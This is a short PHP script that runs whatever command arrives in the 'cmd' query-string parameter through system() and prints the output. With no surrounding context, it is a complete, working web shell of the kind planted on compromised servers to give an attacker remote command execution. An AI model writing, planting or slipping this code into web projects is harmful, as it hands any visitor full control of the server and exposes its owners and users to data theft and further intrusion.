<?php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
